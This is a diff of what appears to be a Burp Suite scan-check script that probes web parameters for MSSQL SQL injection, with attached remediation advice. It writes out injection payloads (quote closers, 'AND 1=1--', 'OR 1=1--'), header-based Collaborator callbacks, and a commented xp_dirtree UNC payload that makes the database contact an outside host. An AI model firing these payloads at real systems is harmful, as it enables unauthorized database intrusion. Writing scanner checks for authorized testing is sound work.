@@ -1,56 +1,83 @@
 metadata:
     language: v2-beta
-    name: "MSSQL SQLi - merged (parser-safe)"
-    description: "Merged MSSQL SQLi checks: error-based, boolean (basic), Collaborator OOB. Optional time/xp blocks are commented for safe import."
+    name: "MSSQL SQLi - expanded (parser-safe)"
+    description: "Expanded MSSQL SQLi checks: additional error patterns, payload variants, header/cookie OOB, multi-payload bruteforce. Optional xp_dirtree/commented blocks included."
     author: "You"
 
 define:
+    # core payloads
     payload_err = "'"
     payload_true = "' AND 1=1--"
     payload_false = "' AND 1=2--"
-    # payload_time_ms = "'; WAITFOR DELAY '00:00:05'--"   # uncomment only if your Burp supports time_ms
-    # payload_time_sec = "'; WAITFOR DELAY '00:00:05'--"  # uncomment only if your Burp supports time (seconds)
-    # payload_xp_template = "'; EXEC master..xp_dirtree '\\\\{generate_collaborator_address()}\\\\foo'--"  # xp_dirtree (commented by default)
+
+    # alternate closers / contexts
+    payload_double_quote = "\""
+    payload_paren_close = "')--"
+    payload_or_numeric = " OR 1=1--"    # for numeric contexts (no initial quote)
+    payload_comment_hash = "'#"
+
+    # xp_dirtree template (commented by default; enable only with permission)
+    # payload_xp_template = "'; EXEC master..xp_dirtree '\\\\{generate_collaborator_address()}\\\\foo'--"
 
 given insertion point then
 
-    # -------- 1) Error-based (always enabled) --------
+    # -------------------- BASELINE: error-based (always enabled) --------------------
     send payload: appending: {payload_err}
-    if {latest.response} matches "(?i)unclosed quotation mark|syntax error near|microsoft sql server" then
-        report issue: name: "MSSQL SQL Injection (Error-Based)" severity: high confidence: certain remediation: "Use parameterized queries and hide DB error messages." detail: "MSSQL error text observed after appending a single quote; likely error-based SQLi."
+    if {latest.response} matches "(?i)unclosed quotation mark|syntax error near|microsoft sql server|invalid column name|procedure or function|conversion failed|incorrect syntax" then
+        report issue: name: "MSSQL SQL Injection (Error-Based)" severity: high confidence: certain remediation: "Use parameterized queries and hide DB error messages." detail: "MSSQL error text observed after appending a single quote; likely error-based SQLi. Expanded regex used to capture more DB error strings."
     end if
 
-    # -------- 2) Boolean-based (simple differ) --------
+    # -------------------- BOOLEAN: simple true/false (always enabled) --------------------
     send payload called true_check: appending: {payload_true}
     send payload called false_check: appending: {payload_false}
     if {true_check.response} differs from {false_check.response} then
         report issue: name: "MSSQL SQL Injection (Boolean-Based Blind)" severity: high confidence: firm remediation: "Sanitize inputs and use prepared statements / parameterized queries." detail: "Responses differ between boolean true and false payloads; possible boolean-blind SQLi."
     end if
 
-    # -------- 3) OOB (Collaborator) - header-based (always enabled) --------
-    # safe and reliable: places the collaborator address in a header so Burp can detect callbacks
+    # -------------------- BOOLEAN ALT: numeric / OR context (optional) --------------------
+    # Use when parameter may be numeric or not quoted. Uncomment to enable.
+    # send payload called num_true: appending: {payload_or_numeric}
+    # send payload called num_false: appending: " OR 1=2--"
+    # if {num_true.response} differs from {num_false.response} then
+    #     report issue: name: "MSSQL SQL Injection (Boolean-Based - numeric/OR)" severity: high confidence: firm remediation: "Sanitize numeric inputs and use parameterized queries." detail: "Responses differ for numeric/OR boolean payloads; possible numeric context blind SQLi."
+    # end if
+
+    # -------------------- MULTI-CLOSER BRUTE (optional) --------------------
+    # Try several common closers: single-quote, double-quote, parenthesis close, comment variants.
+    # Uncomment to enable if you want broader coverage of quoting contexts.
+    # send payload called closer_q: appending: {payload_err}
+    # send payload called closer_dq: appending: {payload_double_quote}
+    # send payload called closer_paren: appending: {payload_paren_close}
+    # send payload called closer_hash: appending: {payload_comment_hash}
+    # if ({closer_q.response} differs from {closer_dq.response}) or ({closer_q.response} differs from {closer_paren.response}) or ({closer_q.response} differs from {closer_hash.response}) then
+    #     report issue: name: "MSSQL SQL Injection (Multi-Closer Differences)" severity: medium confidence: tentative remediation: "Check input handling and quoting context; use parameterized queries." detail: "Different closers produce differing responses — investigate for SQL injection or parsing inconsistencies."
+    # end if
+
+    # -------------------- OOB: collaborator via header (always enabled) --------------------
+    # This is the least privileged OOB approach and worked for you earlier.
     send request called collab_header_check: method: "GET" headers: "Referer": {generate_collaborator_address()} path: "/"
     if dns interactions then
-        report issue: name: "MSSQL SQL Injection (Out-of-Band - header)" severity: high confidence: certain remediation: "Disable/limit xp_* procedures and use least-privilege DB accounts / parameterized queries." detail: "Burp Collaborator observed DNS interactions after a request containing the collaborator address; OOB SQLi may be possible."
+        report issue: name: "MSSQL SQL Injection (Out-of-Band - header)" severity: high confidence: certain remediation: "Disable/limit xp_* procedures and use least-privilege DB accounts / parameterized queries." detail: "Burp Collaborator observed DNS interactions after a request containing the collaborator address in a header; OOB SQLi may be possible."
     end if
 
-    # -------- Optional: xp_dirtree OOB (commented) --------
-    # This injects a UNC path containing the collaborator address into the insertion point to attempt xp_dirtree lookups.
-    # Enable only when you have explicit authorization and understand DB privilege implications.
-    # send payload: appending: {payload_xp_template}
+    # -------------------- OOB: collaborator via Host (optional) --------------------
+    # Some apps reflect Host header value into backend calls — uncomment to test Host-based OOB.
+    # send request called collab_host_check: method: "GET" headers: "Host": {generate_collaborator_address()} path: "/"
     # if dns interactions then
-    #     report issue: name: "MSSQL SQL Injection (Out-of-Band - xp_dirtree)" severity: high confidence: certain remediation: "Disable xp_dirtree/xp_cmdshell; use least-privilege DB accounts and parameterized queries." detail: "Burp Collaborator observed DNS interactions after an xp_dirtree-style payload referencing the collaborator address; high-confidence OOB SQLi."
+    #     report issue: name: "MSSQL SQL Injection (Out-of-Band - Host header)" severity: high confidence: certain remediation: "Sanitize host input and avoid trusting request headers in DB operations." detail: "Burp Collaborator observed DNS interactions after setting Host to collaborator address; investigate possible OOB injection."
     # end if
 
-    # -------- Optional: Time-based checks (commented) --------
-    # If your build supports time_ms, uncomment the payload_time_ms define above and the block below:
-    # send payload: appending: {payload_time_ms}
-    # if ({latest.response.time_ms} - {base.response.time_ms}) >= 4500 then
-    #     report issue: name: "MSSQL SQL Injection (Time-Based Blind - ms)" severity: high confidence: tentative remediation: "Use prepared statements and disallow execution of arbitrary SQL fragments." detail: "Response delayed (~5s) by WAITFOR payload; indicates possible blind SQLi."
+    # -------------------- OOB: collaborator via Cookie (optional) --------------------
+    # If the app reads cookies and uses them server-side, this can trigger OOB behaviors.
+    # send request called collab_cookie_check: method: "GET" headers: "Cookie": "session={generate_collaborator_address()}" path: "/"
+    # if dns interactions then
+    #     report issue: name: "MSSQL SQL Injection (Out-of-Band - Cookie)" severity: high confidence: certain remediation: "Avoid using untrusted cookie values in DB operations; use parameterized queries." detail: "Burp Collaborator observed DNS interactions after sending a cookie value equal to the collaborator address; possible OOB injection."
     # end if
-    #
-    # If your build supports time (seconds), uncomment payload_time_sec and use this block instead:
-    # send payload: appending: {payload_time_sec}
-    # if ({latest.response.time} - {base.response.time}) >= 4.5 then
-    #     report issue: name: "MSSQL SQL Injection (Time-Based Blind - sec)" severity: high confidence: tentative remediation: "Use prepared statements and disallow execution of arbitrary SQL fragments." detail: "Response delayed (~5s) by WAITFOR payload; indicates possible blind SQLi."
+
+    # -------------------- Optional: xp_dirtree param injection (commented - use with permission) --------------------
+    # This injects a UNC path into the vulnerable parameter (requires DB privileges).
+    # Enable only with explicit authorization and awareness of potential noise.
+    # send payload: appending: {payload_xp_template}
+    # if dns interactions then
+    #     report issue: name: "MSSQL SQL Injection (Out-of-Band - xp_dirtree)" severity: high confidence: certain remediation: "Disable xp_dirtree/xp_cmdshell and use least-privilege DB accounts / parameterized queries." detail: "Burp Collaborator observed DNS interactions after xp_dirtree-style payload referencing the collaborator address; high-confidence OOB SQLi."
     # end if
